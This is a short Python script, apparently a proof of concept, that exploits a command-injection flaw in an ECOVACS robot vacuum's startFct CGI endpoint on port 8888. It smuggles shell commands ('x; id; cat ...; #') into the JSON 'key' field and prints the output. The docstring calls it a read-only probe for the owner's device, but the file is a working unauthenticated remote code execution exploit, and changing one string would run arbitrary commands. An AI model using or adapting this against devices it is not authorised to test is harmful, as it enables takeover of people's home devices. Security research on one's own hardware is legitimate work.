"""Read-only probe for owner's robot, run only after joining its ECOVACS Wi-Fi.
Static analysis of 1.11.0 startFct suggests key is interpolated into popen.
This probe suppresses the factory hook and only prints identity/USB role.
"""
import json,urllib.request,sys
host=sys.argv[1] if len(sys.argv)>1 else '192.168.0.1'
cmd='printf ECOVACS_DIAG_BEGIN; id; cat /sys/devices/platform/soc/b2000000.usb/b2000000.dwc3/role; printf ECOVACS_DIAG_END'
payload={'td':'StartFactory','key':'x; '+cmd+'; #'}
req=urllib.request.Request('http://'+host+':8888/cgi-bin/startFct',data=json.dumps(payload).encode(),headers={'Content-Type':'application/json'})
with urllib.request.urlopen(req,timeout=10) as response:
 print(response.read(8192).decode(errors='replace'))
